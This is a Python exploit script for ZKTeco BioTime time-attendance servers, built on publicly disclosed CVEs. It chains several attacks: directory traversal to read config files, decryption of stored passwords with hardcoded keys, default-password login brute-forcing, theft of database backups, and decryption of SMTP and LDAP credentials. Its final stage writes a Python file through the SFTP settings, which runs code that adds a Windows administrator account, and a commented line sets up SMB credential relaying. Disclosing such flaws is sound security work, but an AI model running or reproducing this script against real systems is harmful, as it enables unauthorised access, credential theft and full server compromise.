#  __________.__     ___________.__                
#  \______   \__| ___\__    ___/|__| _____   ____  
#   |    |  _/  |/  _ \|    |   |  |/     \_/ __ \ 
#   |    |   \  (  <_> )    |   |  |  Y Y  \  ___/ 
#   |______  /__|\____/|____|   |__|__|_|  /\___  >
#          \/                            \/     \/ 
# Tested on 8.5.5 (Build:20231103.R1905)
# Tested on 9.0.1 (Build:20240108.18753)
# BioTime, "time" for shellz!
# https://claroty.com/team82/disclosure-dashboard/cve-2023-38952
# https://claroty.com/team82/disclosure-dashboard/cve-2023-38951
# https://claroty.com/team82/disclosure-dashboard/cve-2023-38950
# RCE by adding a user to the system, not the app.
# Relay machine creds over smb, while creating a backup
# Decrypt SMTP, LDAP or SFTP creds, if any.
# Get sql backup. Good luck cracking those hashes!
# Can use Banner to determine which version is running
# Server: Apache/2.4.29 (Win64) mod_wsgi/4.5.24 Python/2.7
# Server: Apache/2.4.52 (Win64) mod_wsgi/4.7.1 Python/3.7
# Server: Apache/2.4.48 (Win64) mod_wsgi/4.7.1 Python/3.7
# Server: Apache => BioTime Version 9
# @w3bd3vil - Krash Consulting (https://krashconsulting.com)
import requests
from bs4 import BeautifulSoup
import os
import json
import sys
from Crypto.Cipher import AES
from Crypto.Cipher import ARC4
import base64
from binascii import b2a_hex, a2b_hex

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',  # Proxy for HTTP traffic
    'https': 'http://127.0.0.1:8080'  # Proxy for HTTPS traffic
}
proxies = {}

target =  sys.argv[1]



def decrypt_rc4(base64_encoded_rc4, password="biotime"):
    encrypted_data = base64.b64decode(base64_encoded_rc4)
    cipher = ARC4.new(password.encode())
    decrypted_data = cipher.decrypt(encrypted_data)
    return decrypted_data.decode()

# base64_encoded_rc4 = "fj8xD5fAY6r6s3I="
# password = "biotime"

# decrypted_data = decrypt_rc4(base64_encoded_rc4, password)
# print("Decrypted data:", decrypted_data)

AES_PASSWORD = b'china@2018encryption#aes'
AES_IV = b'zkteco@china2019'

def filling_data(data, restore=False):
    '''
    :param data: str
    :return: str
    '''
    if restore:
        return data[0:-ord(data[-1])]
    block_size = AES.block_size  # Use AES.block_size instead of None.block_size
    return data + (block_size - len(data) % block_size) * chr(block_size - len(data) % block_size)

def aes_encrypt(content):
    '''
    Encryption
    :param content: str, The length of content must be times of AES.block_size, using filling_data to fill out
    :return: str
    '''
    if isinstance(content, bytes):
        content = str(content, 'utf-8')
    cipher = AES.new(AES_PASSWORD, AES.MODE_CBC, AES_IV)
    encrypted = cipher.encrypt(filling_data(content).encode('utf-8'))
    result = b2a_hex(encrypted).decode('utf-8')
    return result

def aes_decrypt(content):
    '''
    Decryption
    :param content: str or bytes, Encryption string
    :return: str
    '''
    if isinstance(content, str):
        content = content.encode('utf-8')
    cipher = AES.new(AES_PASSWORD, AES.MODE_CBC, AES_IV)
    result = cipher.decrypt(a2b_hex(content)).decode('utf-8')
    return filling_data(result, restore=True)

#Check BioTime
url = f'{target}/license/'
response = requests.get(url, proxies=proxies, verify=False)
html_content = response.content


soup = BeautifulSoup(html_content, 'html.parser')
build_lines = [line.strip() for line in soup.get_text().split('\n') if 'build' in line.lower()]

build = None
for line in build_lines:
    build = line
    print(f"Found BioTime: {line}")
    break

if build != None:
    buildNumber = build[0]
else:
    print("Unsupported Target!")
    sys.exit(1)

# Dir Traversal
url = f'{target}/iclock/file?SN=win&url=/../../../../../../../../windows/win.ini'
response = requests.get(url, proxies=proxies, verify=False)
try:
    print("Dir Traversal Attempt\nOutput of windows/win.ini file:")
    print(base64.b64decode(response.text).decode('utf-8'))
    try:
        url = f'{target}/iclock/file?SN=att&url=/../../../../../../../../biotime/attsite.ini'
        response = requests.get(url, proxies=proxies, verify=False)
        attConfig = base64.b64decode(response.text).decode('utf-8')
        #print(f"Output of BioTime config file: {attConfig}")
    except:
        try:
            url = f'{target}/iclock/file?SN=att&url=/../../../../../../../../zkbiotime/attsite.ini'
            response = requests.get(url, proxies=proxies, verify=False)
            attConfig = base64.b64decode(response.text).decode('utf-8')
            #print(f"Output of BioTime config file: {attConfig}")
        except:
            print("Couldn't get BioTime config file (possibly non default configuration)")
    lines = attConfig.split('\n')

    for i, line in enumerate(lines):
        if "PASSWORD=@!@=" in line:
            dec_att = decrypt_rc4(lines[i].split("@!@=")[1])
            lines[i] = lines[i].split("@!@=")[0]+dec_att
    attConfig_modified = '\n'.join(lines)
    print(f"Output of BioTime Decrypted config file:\n{attConfig_modified}")
except:
    print("Couldn't exploit Dir Traversal")


# Extract Cookies
url = f'{target}/login/'

response = requests.get(url, proxies=proxies, verify=False)

if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    csrf_token_header = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    if csrf_token_header:
        csrf_token_header_value = csrf_token_header['value']
        print(f"CSRF Token Header: {csrf_token_header_value}")
    
    session_id_cookie = response.cookies.get('sessionid')
    if session_id_cookie:
        print(f"Session ID: {session_id_cookie}")
    
    csrf_token_value = response.cookies.get('csrftoken')
    if csrf_token_value:
        print(f"CSRF Token Cookie: {csrf_token_value}")
else:
    print(f"Failed to retrieve data from {url}. Status code: {response.status_code}")

# Login Now!
cookies = {
    'sessionid': session_id_cookie,
    'csrftoken': csrf_token_value
}

for i in range(1,10):
    username = i
    password = '123456' # Deafult password!

    data = {
        'username': username,
        'password': password,
        'captcha':'',
        'login_user':'employee'
    }

    headers = {
        'User-Agent': 'Krash Consulting',
        'X-CSRFToken': csrf_token_header_value
    }

    response = requests.post(url, data=data, cookies=cookies, headers=headers, proxies=proxies, verify=False)

    if response.status_code == 200:
        json_response = response.json()
        ret_value = json_response.get('ret')
        if ret_value == 0:
            print(f"Valid Credentials found: Username is {username} and password is {password}")
            session_id_cookie = response.cookies.get('sessionid')
            if session_id_cookie:
                print(f"Auth Session ID: {session_id_cookie}")
            
            csrf_token_value = response.cookies.get('csrftoken')
            if csrf_token_value:
                print(f"Auth CSRF Token Cookie: {csrf_token_value}")
            break

if i == 9:
    print("No valid users found!")
    sys.exit(1)

# Check for Backups
def downloadBackup():
    url = f'{target}/base/dbbackuplog/table/?page=1&limit=33'
    cookies = {
        'sessionid': session_id_cookie,
        'csrftoken': csrf_token_value
    }

    response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
    response_data = response.json()
    print("Backup files list")
    print(json.dumps(response_data, indent=4))

    if response_data['count'] > 0:
        backup_info = response_data['data'][0]  # Latest Backup
        operator_name = backup_info['operator']
        backup_file = backup_info['backup_file']
        db_type = backup_info['db_type']


        print("Operator:", operator_name)
        print("Backup File:", backup_file)
        print("Database Type:", db_type)

        if buildNumber == "9":
            createBackup()
            print("Backup File password: Krash")

        #download = os.path.basename(backup_file)

        path = os.path.normpath(backup_file)
        try:
            split_path = path.split(os.sep)
            files_index = split_path.index('files')
            relative_path = '/'.join(split_path[files_index + 1:])
        except:
            return False

        url = f'{target}/files/{relative_path}'
        print(url)
        response = requests.get(url, proxies=proxies, verify=False)
        if response.status_code == 200:
            filename = os.path.basename(url)
            with open(filename, 'wb') as file:
                file.write(response.content)
            print(f"File '{filename}' downloaded successfully.")
        else:
            print("Failed to download the file. Status code:", response.status_code)
        return False
    else:
        print("No backup Found!")
        return True

def createBackup(targetPath=None):
    print("Attempting to create backup.")
    url = f'{target}/base/dbbackuplog/action/?action_name=44424261636b75704d616e75616c6c79&_popup=true&id='
    cookies = {
        'sessionid': session_id_cookie,
        'csrftoken': csrf_token_value
    }
    response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
    html_content = response.content

    soup = BeautifulSoup(html_content, 'html.parser')
    pathBackup = [line.strip() for line in soup.get_text().split('\n') if 'name="file_path"' in line.lower()]
    print(f"Possible backup location: {pathBackup}")


    url = f'{target}/base/dbbackuplog/action/'

    if targetPath == None:
        if buildNumber == "9" or build[:5] == "8.5.5":
            targetPath = "C:\\ZKBioTime\\files\\backup\\"
        else:
            targetPath = "C:\\BioTime\\files\\fw\\"
    if buildNumber == "9":
        data = {
            'csrfmiddlewaretoken': csrf_token_value,
            'file_path':targetPath,
            'action_name': '44424261636b75704d616e75616c6c79',
            'backup_encryption_choices': '2',
            'auto_backup_password': 'Krash'
        }
    else:
        data = {
            'csrfmiddlewaretoken': csrf_token_value,
            'file_path':targetPath,
            'action_name': '44424261636b75704d616e75616c6c79'
        }
    response = requests.post(url,  cookies=cookies, data=data, proxies=proxies, verify=False)
    if response.status_code == 200:
        print("Backup Initiated.")
    else:
        print("Backup failed!")

if downloadBackup():
    createBackup()
    downloadBackup()

url = f'{target}/base/api/systemSettings/email_setting/'
cookies = {
    'sessionid': session_id_cookie,
    'csrftoken': csrf_token_value
}

response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
if response.status_code == 200:
    response_data = response.json()
    print("SMTP Settings")
    for key in response_data:
        if 'password' in key.lower():
            value = response_data[key]
            #print(f'{key} decrypted value {aes_decrypt(value)}')
            response_data[key] = aes_decrypt(value)

    print(json.dumps(response_data, indent=4))


url = f'{target}/base/api/systemSettings/ldap_setup/'
cookies = {
    'sessionid': session_id_cookie,
    'csrftoken': csrf_token_value
}

response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
if response.status_code == 200:
    response_data = response.json()
    print("LDAP Settings")
    for key in response_data:
        if 'password' in key.lower():
            value = response_data[key]
            #print(f'{key} decrypted value {aes_decrypt(value)}')
            response_data[key] = aes_decrypt(value)
    print(json.dumps(response_data, indent=4))


def sftpRCE():
    print("Attempting RCE!")
    #Add SFTP, Need valid IP/credentials here!
    print("Adding FTP List")

    url = f'{target}/base/sftpsetting/add/'
    myIpaddr = '192.168.0.11'
    myUser = 'test'
    myPassword = 'test@123'

    cookies = {
        'sessionid': session_id_cookie,
        'csrftoken': csrf_token_value
    }
    data = {
        'csrfmiddlewaretoken': csrf_token_value,
        'host':myIpaddr,
        'port':22,
        'is_sftp': 1,
        'user_name':myUser,
        'user_password':myPassword,
        'user_key':'',
        'action_name': '47656e6572616c416374696f6e4e6577'
    }
    response = requests.post(url,  cookies=cookies, data=data, proxies=proxies, verify=False)
    print(response)

    url = f'{target}/base/sftpsetting/table/?page=1&limit=33'
    cookies = {
        'sessionid': session_id_cookie,
        'csrftoken': csrf_token_value
    }

    response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
    response_data = response.json()
    print("FTP List")
    print(json.dumps(response_data, indent=4))

    backup_info = response_data['data'][0]  # Latest SFTP
    getID = backup_info['id']

    if getID:
        print("ID to edit ", getID)

    #Edit SFTP (Response can have errors, it doesn't matter)
    print("Editing SFTP Settings")
    if buildNumber == "9":
        dirTraverse = '\..\..\..\python311\lib\io.py'
    else:
        dirTraverse = '\..\..\..\python37\lib\io.py'

    if len(dirTraverse) > 30:
        print("Directory Traversal length is greater than 30, will not work!")
        sys.exit(1)

    url = f'{target}/base/sftpsetting/edit/'

    cookies = {
        'sessionid': session_id_cookie,
        'csrftoken': csrf_token_value
    }
    data = {
        'csrfmiddlewaretoken': csrf_token_value,
        'host':myIpaddr,
        'port':22,
        'is_sftp': 1,
        'user_name': dirTraverse,
        'user_password':myPassword,
        'user_key':'import os\nos.system("net user /add omair190 KCP@ssw0rd && net localgroup administrators ...',
        'obj_id': getID
    }
    response = requests.post(url,  cookies=cookies, data=data, proxies=proxies, verify=False)
    print("A new user should be added now on the server \nusername: omair190\npassword: KCP@ssw0rd")

    #Delete SFTP
    print("Deleting SFTP Settings")
    url = f'{target}/base/sftpsetting/action/'

    cookies = {
        'sessionid': session_id_cookie,
        'csrftoken': csrf_token_value
    }
    data = {
        'csrfmiddlewaretoken': csrf_token_value,
        'id': getID,
        'action_name': '47656e6572616c416374696f6e44656c657465'
    }
    response = requests.post(url,  cookies=cookies, data=data, proxies=proxies, verify=False)

#RCE
if buildNumber == "9" or build[:5] == "8.5.5":
    sftpRCE()

# #Relay Creds
# createBackup("\\\\192.168.0.11\\KC\\test")
